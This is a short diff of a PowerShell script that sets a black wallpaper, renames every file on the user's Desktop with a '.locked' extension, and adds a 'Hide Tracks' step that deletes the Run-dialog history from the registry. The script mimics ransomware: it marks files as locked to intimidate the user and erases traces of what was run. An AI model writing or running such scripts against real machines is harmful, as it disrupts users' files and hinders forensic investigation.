@@ -25,5 +25,8 @@ Add-Type -TypeDefinition $setwallpapersrc
 
 [Wallpaper]::SetWallpaper("C:\temp\black.jpg")
 
-
+# Rename Files
 Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
+
+# Hide Tracks
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
